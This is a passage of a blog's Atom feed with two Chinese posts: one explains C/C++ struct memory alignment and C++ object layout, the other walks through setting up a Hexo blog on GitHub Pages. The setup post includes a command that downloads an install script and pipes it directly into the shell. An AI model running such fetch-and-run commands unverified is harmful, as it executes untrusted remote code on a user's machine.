href="#2-整个结构体或者类的大小为它们中的内置类型大小最大的那一个和编译器默认大小（或用-pragma-pack-n-指定的n中两者较小的那个的整数倍-而当结构体或者类为定义对象的自定义类型定义时，其对齐方式参照其本身内置的最大的那个的然后再和编译器默认或声明比较中小的那个，意思说由它们中最小的那个代表它们来进行上述操作。" class="headerlink" title="2. 整个结构体或者类的大小为它们中的内置类型大小最大的那一个和编译器默认大小（或用#pragma pack (n)指定的n中两者较小的那个的整数倍,而当结构体或者类为定义对象的自定义类型定义时，其对齐方式参照其本身内置的最大的那个的然后再和编译器默认或声明比较中小的那个，意思说由它们中最小的那个代表它们来进行上述操作。"></a>2. 整个结构体或者类的<strong>大小</strong>为它们中的内置类型大小最大的那一个和编译器默认大小（或用#pragma pack (n)指定的n中两者较小的那个的整数倍,而当结构体或者类为定义对象的自定义类型定义时，其对齐方式参照其本身内置的最大的那个的然后再和编译器默认或声明比较中小的那个，意思说由它们中最小的那个代表它们来进行上述操作。</h4><blockquote>
<p>可能听起来很拗口，但是一旦把握了准则在应对这些问题的时候就很轻而易举了．其实主要是两个点，一个是变量放的偏移地址，另一个是复杂类型的总的大小．首先我们要知道为什么编译器需要对变量进行内存对齐？知道内存组织的童鞋可能有些感触，我们的代码运行的时候必须首先从磁盘(或其他非易失性介质)通过外部总线加载到内存中，然后再跳转到相应处运行．基于现有的计算机运行机制不断地进行<strong>取指，译码，执行等</strong>操作，由于内存本身的半导体的物理特性使得内存并不是一次性有几个G那么多而是通过很小的介质(一般是8位)不断地”串并联”起来的，一般能够保证一个地址能够寻址一个字节的数据，其实是半导体的导通与截止表示的计算机中的”1”和”0”．打个比方，如果地址不是偶数的，要取偶数个的数据的话，CPU在硬件上可能要多花几个时钟周期来进行取数据和整合，才能保证数据不出错．因此很多算法也都是以空间换时间的思想来加快计算．还有就是在嵌入式领域，由于板子或者芯片本身的内存资源非常有限，必须要求嵌入式程序员写出几乎<code>磕碜</code>的代码才能保证运行流畅等．因此，至少在不怎么缺内存的PC或者Server领域，为了加快计算，还是可以采用编译器进行的优化的．(可能还有其他技术比如缓存啥的我们先不讨论)</p>
</blockquote>
<h3 id="3-Win栗子如下："><a href="#3-Win栗子如下：" class="headerlink" title="3. Win栗子如下："></a>3. Win栗子如下：</h3><h4 id="1-这是以前我用Win的时候VC-6-0编译器的效果图"><a href="#1-这是以前我用Win的时候VC-6-0编译器的效果图" class="headerlink" title="1. 这是以前我用Win的时候VC++ 6.0编译器的效果图"></a>1. 这是以前我用Win的时候VC++ 6.0编译器的效果图</h4><p><img src="/images/1.png" alt="配置"></p>
<h4 id="2-此处说明int类型的b在排位置的时候放到了偏移处为4的倍数，而非数据填充a剩下的"><a href="#2-此处说明int类型的b在排位置的时候放到了偏移处为4的倍数，而非数据填充a剩下的" class="headerlink" title="2. 此处说明int类型的b在排位置的时候放到了偏移处为4的倍数，而非数据填充a剩下的"></a>2. 此处说明int类型的b在排位置的时候放到了偏移处为4的倍数，而非数据填充a剩下的</h4><p><img src="/images/2.png" alt="int b"></p>
<h4 id="3-下面这一处说明大小是按照int类型-最大呀-的整数倍来取"><a href="#3-下面这一处说明大小是按照int类型-最大呀-的整数倍来取" class="headerlink" title="3. 下面这一处说明大小是按照int类型(最大呀)的整数倍来取"></a>3. 下面这一处说明大小是按照int类型(最大呀)的整数倍来取</h4><p><img src="/images/3.png" alt="整数倍"></p>
<h4 id="4-说明当类型为数组的时候，只按照它的类型来对齐而非整个大小"><a href="#4-说明当类型为数组的时候，只按照它的类型来对齐而非整个大小" class="headerlink" title="4. 说明当类型为数组的时候，只按照它的类型来对齐而非整个大小"></a>4. 说明当类型为数组的时候，只按照它的类型来对齐而非整个大小</h4><p><img src="/images/4.png" alt="数组"></p>
<h4 id="5-说明第二个元素char类型的可以在任何偏移处安放-因为它是一个字节啊"><a href="#5-说明第二个元素char类型的可以在任何偏移处安放-因为它是一个字节啊" class="headerlink" title="5. 说明第二个元素char类型的可以在任何偏移处安放(因为它是一个字节啊)"></a>5. 说明第二个元素char类型的可以在任何偏移处安放(因为它是一个字节啊)</h4><p><img src="/images/5.png" alt="char"></p>
<h4 id="6-说明-pragma-pack-n-n非2的幂的值时候无效"><a href="#6-说明-pragma-pack-n-n非2的幂的值时候无效" class="headerlink" title="6. 说明#pragma pack (n) n非2的幂的值时候无效"></a>6. 说明#pragma pack (n) n非2的幂的值时候无效</h4><p><img src="/images/6.png" alt="#pragma pack (n)"></p>
<h4 id="7-说明结构体作为一个类型在插入时候是以它自己有的最大字节元素来参考放的偏移．然后总的大小是8的倍数"><a href="#7-说明结构体作为一个类型在插入时候是以它自己有的最大字节元素来参考放的偏移．然后总的大小是8的倍数" class="headerlink" title="7. 说明结构体作为一个类型在插入时候是以它自己有的最大字节元素来参考放的偏移．然后总的大小是8的倍数"></a>7. 说明结构体作为一个类型在插入时候是以它自己有的最大字节元素来参考放的偏移．然后总的大小是8的倍数</h4><p><img src="/images/7.png" alt="struct"></p>
<h4 id="8-说明pragma-pack-3-没作用"><a href="#8-说明pragma-pack-3-没作用" class="headerlink" title="8. 说明pragma pack (3)没作用"></a>8. 说明pragma pack (3)没作用</h4><p><img src="/images/8.png" alt="pack (3)"></p>
<h3 id="4-Linux栗子如下-据说gcc默认是4-bytes的对齐大小-："><a href="#4-Linux栗子如下-据说gcc默认是4-bytes的对齐大小-：" class="headerlink" title="4. Linux栗子如下(据说gcc默认是4 bytes的对齐大小)："></a>4. Linux栗子如下(据说gcc默认是4 bytes的对齐大小)：</h3><h4 id="1-这是我用ubuntu-16-04-amd64-ssh连接ubuntu-16-04-i386之后gcc版本号"><a href="#1-这是我用ubuntu-16-04-amd64-ssh连接ubuntu-16-04-i386之后gcc版本号" class="headerlink" title="1. 这是我用ubuntu 16.04 amd64 ssh连接ubuntu 16.04 i386之后gcc版本号:"></a>1. 这是我用ubuntu 16.04 amd64 ssh连接ubuntu 16.04 i386之后gcc版本号:</h4><p><img src="/images/gcc-st-1.png" alt="gcc -v"></p>
<h4 id="2-这个应该默认是4字节的对齐，大小和元素中最大的int比还是4字节"><a href="#2-这个应该默认是4字节的对齐，大小和元素中最大的int比还是4字节" class="headerlink" title="2. 这个应该默认是4字节的对齐，大小和元素中最大的int比还是4字节"></a>2. 这个应该默认是4字节的对齐，大小和元素中最大的int比还是4字节</h4><p><img src="/images/gcc-st-2.png" alt="4 butys"></p>
<h4 id="3-在gcc中加入功能和pragma-pack差不多的attribute选项即可要求编译器改变默认对齐大小，当值为1时，几乎没有空间浪费，但是用起来的时候却去坑CPU了…"><a href="#3-在gcc中加入功能和pragma-pack差不多的attribute选项即可要求编译器改变默认对齐大小，当值为1时，几乎没有空间浪费，但是用起来的时候却去坑CPU了…" class="headerlink" title="3. 在gcc中加入功能和pragma pack差不多的attribute选项即可要求编译器改变默认对齐大小，当值为1时，几乎没有空间浪费，但是用起来的时候却去坑CPU了…"></a>3. 在gcc中加入功能和pragma pack差不多的<strong>attribute</strong>选项即可要求编译器改变默认对齐大小，当值为1时，几乎没有空间浪费，但是用起来的时候却去坑CPU了…</h4><p><img src="/images/gcc-st-3.png" alt="attri_1"></p>
<h4 id="4-在这里只是a之后的那一个字节是填充的-short只要是偶数偏移就可以插入咯，int在这里其实也是偶数，只是恰好放在4的倍数偏移处而已，attribute干得好事"><a href="#4-在这里只是a之后的那一个字节是填充的-short只要是偶数偏移就可以插入咯，int在这里其实也是偶数，只是恰好放在4的倍数偏移处而已，attribute干得好事" class="headerlink" title="4. 在这里只是a之后的那一个字节是填充的,short只要是偶数偏移就可以插入咯，int在这里其实也是偶数，只是恰好放在4的倍数偏移处而已，attribute干得好事~"></a>4. 在这里只是a之后的那一个字节是填充的,short只要是偶数偏移就可以插入咯，int在这里其实也是偶数，只是恰好放在4的倍数偏移处而已，<strong>attribute</strong>干得好事~</h4><p><img src="/images/gcc-st-4.png" alt="attri_2"></p>
<h4 id="5-证明了有pack为1的地方必定不留一点空隙"><a href="#5-证明了有pack为1的地方必定不留一点空隙" class="headerlink" title="5. 证明了有pack为1的地方必定不留一点空隙~~~"></a>5. 证明了有pack为1的地方必定不留一点空隙~~~</h4><p><img src="/images/gcc-st-5.png" alt="pack_1"></p>
<h4 id="6-第一个foo结构体虽然double为8字节，但是由于默认为4字节的对齐，所以根据对齐原则取两者中较小的对结构体大小倍数，因此为12字节．第二个结构体bar插入了第一个结构体，因此结构体d放在哪儿呢-应该是它自己作为结构体的时候元素中最大的-这个栗子为double-要是有char-类型数组超过8，不用管，认为是char-和默认的4相比，还是取较小的为偏移处防止，所以short之后空两个就可以插入了．大小也是一样，直接占12字节就是了．后面的参照规则即可得出．"><a href="#6-第一个foo结构体虽然double为8字节，但是由于默认为4字节的对齐，所以根据对齐原则取两者中较小的对结构体大小倍数，因此为12字节．第二个结构体bar插入了第一个结构体，因此结构体d放在哪儿呢-应该是它自己作为结构体的时候元素中最大的-这个栗子为double-要是有char-类型数组超过8，不用管，认为是char-和默认的4相比，还是取较小的为偏移处防止，所以short之后空两个就可以插入了．大小也是一样，直接占12字节就是了．后面的参照规则即可得出．" class="headerlink" title="6. 第一个foo结构体虽然double为8字节，但是由于默认为4字节的对齐，所以根据对齐原则取两者中较小的对结构体大小倍数，因此为12字节．第二个结构体bar插入了第一个结构体，因此结构体d放在哪儿呢?应该是它自己作为结构体的时候元素中最大的(这个栗子为double,要是有char 类型数组超过8，不用管，认为是char)和默认的4相比，还是取较小的为偏移处防止，所以short之后空两个就可以插入了．大小也是一样，直接占12字节就是了．后面的参照规则即可得出．"></a>6. 第一个foo结构体虽然double为8字节，但是由于默认为4字节的对齐，所以根据对齐原则取两者中较小的对结构体大小倍数，因此为12字节．第二个结构体bar插入了第一个结构体，因此结构体d放在哪儿呢?应该是它自己作为结构体的时候元素中最大的(这个栗子为double,要是有char 类型数组超过8，不用管，认为是char)和默认的4相比，还是取较小的为偏移处防止，所以short之后空两个就可以插入了．大小也是一样，直接占12字节就是了．后面的参照规则即可得出．</h4><p><img src="/images/gcc-st-6.png" alt="st_to_st"></p>
<h4 id="7-由于第一个结构体声明为1字节的对齐粒度，因此全部都占着吧，但是bar结构体剩余的元素都必须和默认的4进行比较，来放置和占大小．"><a href="#7-由于第一个结构体声明为1字节的对齐粒度，因此全部都占着吧，但是bar结构体剩余的元素都必须和默认的4进行比较，来放置和占大小．" class="headerlink" title="7. 由于第一个结构体声明为1字节的对齐粒度，因此全部都占着吧，但是bar结构体剩余的元素都必须和默认的4进行比较，来放置和占大小．"></a>7. 由于第一个结构体声明为1字节的对齐粒度，因此全部都占着吧，但是bar结构体剩余的元素都必须和默认的4进行比较，来放置和占大小．</h4><p><img src="/images/gcc-st-7.png" alt="st_to_aligned(1)"></p>
<h3 id="5-C-中的高级之处"><a href="#5-C-中的高级之处" class="headerlink" title="5. C++中的高级之处"></a>5. C++中的高级之处</h3><blockquote>
<p>至于C和C++的区别我就不再重复教科书上的内容．只是觉得作为一个developer可能只会关心功能实现，不会管各种机制的内部实现，反正丢给编译器去翻译和安排就是咯，咱又不是研究者．但是一旦出现bug且需要调试器支持的时候，底层的实现就不得不去啃了．编译器也是人开发出来的，当然也少不了出问题，只是现代开发体系为了降低开发难度因此对计算机的<strong>封装</strong>程度已经快到了<code>说话编程</code>的地步了．重复造轮子有必要吗？珍爱生命，快用py？  </p>
</blockquote>
<h4 id="1-C-中的结构体和类的区别？"><a href="#1-C-中的结构体和类的区别？" class="headerlink" title="1.C++中的结构体和类的区别？"></a>1.C++中的结构体和类的区别？</h4><p>根据C++的标准它俩的区别应该只是默认的访问权限的不同，其他该有的编译器(比如构造函数，析构函数等)还是会允许程序员实现的．以前在微博上分析过一道题<a href="http://weibo.com/p/230418e682a92a0102w5wl?mod=zwenzhang" target="_blank" rel="external">链接</a>.因此，在C++中，为了让编译器能够根据标准对各种权限进行检查并生成程序员想要的代码，还是用class比较好．我们不能单调地看待private声明或者const的成员，认为它是不可能被子类或者其他非正常手段修改的．要知道我们所谓的编程最主要是根据标准和规则对编译器进行交互，让编译器取帮我们做翻译工作，一旦编译器通过，程序被加载到内存中后一切的一切被视为<code>高低电平</code>或者其他二进制信息，到时候让CPU译码之后想怎么干就怎么干~_~(当然这是intel 8086时代，从286开始就开始了保护模式).</p>
<h4 id="2-C-中class的虚函数"><a href="#2-C-中class的虚函数" class="headerlink" title="2. C++中class的虚函数"></a>2. C++中class的虚函数</h4><p>C++中的虚函数机制保证了动态绑定，实现了直到程序执行的时候才选择执行哪个代码．一般编译器的实现是在对象空间(类被实例化后)开始的4字节(32位OS)保存一个虚函数表指针，继承了几个类中的虚函数，一般就会产生几个虚函数表指针，再加上数据成员(除去静态成员),这个对象的大小大概就是这么多了．类的方法并不单独属于对象，每一次调用方法的时候必须要传入this指针，其实就是这个对象的首地址．在VC++中一般采用intel 的ecx寄存器作为this指针的载体．例如(<code>obj.func(a, b, c);</code>)在编译器翻译的汇编代码里面等价于(<code>func(&amp;obj, a, b, c);</code>),某些编译器甚至允许这样调用．因为底层的汇编代码一样啊….</p>
<hr>
<p>先总结这么多吧，其实想真正弄清楚的话还需亲自实现或者读懂一个编译器，不仅仅考虑编译原理里面的词语法分析等，而更要从硬件层面取理解各种软件设计思维模式．毕竟软件是跑在硬件这个载体上面的，各种效率问题要经得起推敲的，为啥选择了GNU/Linux呢？可不仅仅因为是开源免费的原因吧~_~</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;关于C-C-中结构体-类-内存对齐问题&quot;&gt;&lt;a href=&quot;#关于C-C-中结构体-类-内存对齐问题&quot; class=&quot;headerlink&quot; title=&quot;关于C/C++中结构体(类)内存对齐问题&quot;&gt;&lt;/a&gt;关于C/C++中结构体(类)内存对齐问题&lt;/h2&gt;&lt;hr
    
    </summary>
    
      <category term="study" scheme="http://embpgp.github.io/categories/study/"/>
    
    
      <category term="C/C++" scheme="http://embpgp.github.io/tags/C-C/"/>
    
  </entry>
  
  <entry>
    <title>Hello world</title>
    <link href="http://embpgp.github.io/2016/08/16/hello-world/"/>
    <id>http://embpgp.github.io/2016/08/16/hello-world/</id>
    <published>2016-08-16T07:10:22.000Z</published>
    <updated>2016-11-04T02:12:51.769Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Hexo-and-NexT-on-Github-建博客折腾…"><a href="#Hexo-and-NexT-on-Github-建博客折腾…" class="headerlink" title="Hexo and NexT on Github 建博客折腾…"></a>Hexo and NexT on Github 建博客折腾…</h1><hr>
<blockquote>
<p>本来已经搭建好了,后来在知乎上看到了自己以前想解决的问题—&gt;如何保证仓库所有的都同步.因为hexo只会生成网页所需要的部分,并不会将本地仓库所有内容都上传至github,由此再次折腾….</p>
</blockquote>
<p><strong>参考资料</strong>  </p>
<ol>
<li><a href="https://hexo.io/zh-cn/docs/" title="Hexo官网" target="_blank" rel="external">Hexo.io原装教程:https://hexo.io/zh-cn/docs/</a>  </li>
<li><a href="http://theme-next.iissnan.com/theme-settings.html" title="Next主题" target="_blank" rel="external">Next主题配置:http://theme-next.iissnan.com/theme-settings.html</a>  </li>
<li><a href="http://ibruce.info/2013/11/22/hexo-your-blog/" title="不如的博客" target="_blank" rel="external">不如的教程，很是详细:http://ibruce.info/2013/11/22/hexo-your-blog/</a>  </li>
<li><a href="http://bubkoo.com/2013/12/16/hexo-issure/" title="tags.." target="_blank" rel="external">bubukoo:http://bubkoo.com/2013/12/16/hexo-issure/</a>  </li>
<li><a href="http://www.cnblogs.com/debugzer0/articles/5461804.html" target="_blank" rel="external">新增tags等:http://www.cnblogs.com/debugzer0/articles/5461804.html</a>  </li>
<li><a href="http://crazymilk.github.io/2015/12/28/GitHub-Pages-Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/" target="_blank" rel="external">双份仓库:http://crazymilk.github.io/2015/12/28/GitHub-Pages-Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</a></li>
</ol>
<hr>
<h1 id="装环境-详情参考官网教程-此处简述，至少github环境安装从略-Windows的有点坑-可以直接去nodejs官网下载msi安装"><a href="#装环境-详情参考官网教程-此处简述，至少github环境安装从略-Windows的有点坑-可以直接去nodejs官网下载msi安装" class="headerlink" title="装环境(详情参考官网教程,此处简述，至少github环境安装从略~_~Windows的有点坑,可以直接去nodejs官网下载msi安装)"></a>装环境(详情参考官网教程,此处简述，至少github环境安装从略~_~Windows的有点坑,可以直接去nodejs官网下载msi安装)</h1><p><strong>安装Node.js</strong><br>    Wget:<br>    <code>$ wget -qO- https://raw.github.com/creationix/nvm/master/install.sh | sh</code><br>    安装完成后，重启终端并执行一下命令：<br>    <code>$ nvm install stable</code><br><strong>安装Hexo</strong><br>    <code>$ npm install hexo-cli -g　　#装hexo</code><br><strong>初始化项目并开启服务</strong>(在github上建立一个名为username.github.io(或者com)项目，并在本地仓库进行绑定)</p>
<pre><code class="bash">$ hexo init username.github.io　<span class="comment">#此处应保证项目(username替换成你的名字)目录已被git remote add等操作过即已经绑定github项目,如果不绑定也能用即可忽略  </span>
$ <span class="built_in">cd</span> username.github.io　　　　　　<span class="comment">#切换到工作目录   </span>
$ npm install　　　　<span class="comment">#npm加载,从远程端加载默认配置文件到本地  </span>
$ hexo g　　　<span class="comment">#生成相应的文件和文档,每次更改之后都要键入这行命令，或者直接键入hexo g -d就可生成并上传  </span>
$ hexo s 　　　<span class="comment">#开启服务监听，即在本地可以访问，默认是http://localhost:4000,每次可以先在本地浏览无误后上传至github  </span>
$ hexo d　　　<span class="comment">#上传至github,可以在浏览器键入username.github.io二级域名进行访问，在此之前需要配置好_config.yml文件  </span>
<span class="comment">#各种插件</span>
npm install hexo-generator-index --save
npm install hexo-generator-archive --save
npm install hexo-generator-category --save
npm install hexo-generator-tag --save
npm install hexo-server --save
npm install hexo-deployer-git --save
npm install hexo-deployer-heroku --save
npm install hexo-deployer-rsync --save
npm install hexo-deployer-openshift --save
npm install hexo-renderer-marked@0.2 --save
npm install hexo-renderer-stylus@0.2 --save
npm install hexo-generator-feed@1 --save
npm install hexo-generator-sitemap@1 --save
npm install hexo-generator-searchdb --save    <span class="comment">#搜索服务</span>
npm install --save hexo-generator-index
npm install --save hexo-generator-archive 
npm install --save hexo-generator-tag
</code></pre>
<blockquote>
<p>如果出现生成之后没有看到预期的效果,可尝试<code>hexo clean; rm -rf .deploy_git; hexo g</code>来重新生成.  </p>
</blockquote>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p><code>按照教程更改相应参数即可，若上述命令中遇到有错误，可直接google或者按照错误打印出来的网址进行访问即可得到解决方案,下图是我的github配置,某些情况下可能需要改成使用https,但是仍然可以不必每次都输入账户名和密码</code>(以前的配置)<br><img src="/images/git.png" alt="github配置"></p>
<h1 id="选择主题"><a href="#选择主题" class="headerlink" title="选择主题"></a>选择主题</h1><p><code>我觉得加载一个好的主题对一个博客还是很重要的，所以我找了很久，官方放出来的链接在这里</code><a href="https://hexo.io/themes/index.html" title="theme" target="_blank" rel="external">https://hexo.io/themes/index.html</a>,<code>慢慢寻找吧，几乎都是开源可用的，有一些需要一些前端方面的知识．建议选择Next．pacman等经典的主题，即简单又美观.</code>  </p>
<h1 id="编辑和发布"><a href="#编辑和发布" class="headerlink" title="编辑和发布"></a>编辑和发布</h1><p><code>参考前文教程装好所有的插件(评论系统，统计，打赏系统等)之后就可以自己写文章发布了，在这里注意完成菜单下的各个类别的目录的创建．比如</code><strong>hexo new page “tags”</strong><code>等，否则会导致访问失败．参考快速写文章的命令以及生成和发布命令可以使得写作是一种享受哦．一起来用MarkDown写博客吧.</code>  </p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Hexo-and-NexT-on-Github-建博客折腾…&quot;&gt;&lt;a href=&quot;#Hexo-and-NexT-on-Github-建博客折腾…&quot; class=&quot;headerlink&quot; title=&quot;Hexo and NexT on Github 建博客折腾…&quot;&gt;
    
    </summary>
    
      <category term="study" scheme="http://embpgp.github.io/categories/study/"/>
    
    
      <category term="Configure" scheme="http://embpgp.github.io/tags/Configure/"/>
    
  </entry>
  
</feed>
